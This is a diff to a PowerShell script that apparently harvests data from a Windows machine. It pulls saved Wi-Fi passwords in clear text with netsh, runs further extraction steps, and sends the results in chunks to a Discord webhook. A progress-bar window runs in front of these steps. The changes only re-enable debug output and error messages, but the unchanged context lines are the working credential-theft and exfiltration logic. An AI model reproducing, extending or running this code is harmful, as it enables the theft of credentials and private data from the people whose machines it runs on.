@@ -136,7 +136,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     try {
                         $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
                     } catch {
-                        #Write-Host "Failed to retrieve password for $wlan"
+                        Write-Host "Failed to retrieve password for $wlan"
                         $passw = "N/A" # Assign a placeholder if password retrieval fails
                     }
             
@@ -150,7 +150,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     try {
                         Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
                     } catch {
-                        #Write-Host "Failed to send data to Discord webhook"
+                        Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
                     }
 
                     # Update progress bar value
@@ -167,13 +167,13 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                 # Add-Type -AssemblyName PresentationFramework
                 # [System.Windows.MessageBox]::Show('Netsh checked!', 'Notification')
             } catch {
-                #Write-Host "An error occurred: $($_.Exception.Message)"
+                Write-Host "An error occurred: $($_.Exception.Message)"
                 Add-Type -AssemblyName PresentationFramework
                 [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
             }
             $textBlock.Text = "Extracted!"
             $textBlock.Text = "Starting operation 2..."
-            # Write-Output "Completed Operation 1 - NETSH"
+            Write-Output "Completed Operation 1 - NETSH"
         }
         1 {
             # Operation 2
@@ -203,7 +203,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             $textBlock.Text = "Done operation 2!"
             $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps
 
-            # Write-Output "Completed Operation 2"
+            Write-Output "Completed Operation 2 Started the executable"
         }
         2 {
             # Operation 3 - EXTRACT DATA 
@@ -228,7 +228,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
             $textBlock.Text = "Done operation 3"
             $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
-            # Write-Output "Completed Operation 3 - EXTRACT DATA"
+
+            Write-Output "Completed Operation 3 - data saved"
         }
         4 {
             # Operation 4 - SEND TO DISCORD
@@ -264,9 +265,9 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
                         Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                     } catch {
-                        #Write-Host "Error sending request: $_"
+                        Write-Host "Error sending request: $_"
                         Add-Type -AssemblyName PresentationFramework
-                        [System.Windows.MessageBox]::Show("Error sending request: $_", 'Error')
+                        [System.Windows.MessageBox]::Show("Error sending request: $_. Check Internet!", 'Error')
                     }
 
                     # Inside the foreach loop, after each chunk is sent
@@ -283,7 +284,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                 
                 }
             } else {
-                #Write-Host "File not found: $filePath"
+                Write-Host "File not found: $filePath"
                 Add-Type -AssemblyName PresentationFramework
                 [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
             }
@@ -399,7 +400,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                             Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                             Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                         } catch {
-                            # Write-Host "Error sending request: $_"
+                            Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
                         }
 
                         # Update progress bar value
@@ -415,7 +416,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     }
                 }
             } else {
-                # Write-Host "File not found: $filePath"
+                Write-Host "File not found: $filePath"
                 Add-Type -AssemblyName PresentationFramework
             [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
             }
@@ -451,7 +452,7 @@ $window.Close()
 Stop-Transcript
 
 # Final output (if needed)
-# Write-Output "All operations completed!"
+Write-Output "All operations completed!"
 # Display a message box indicating completion
 Add-Type -AssemblyName PresentationFramework
 [System.Windows.MessageBox]::Show("All operations completed!", "Success", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
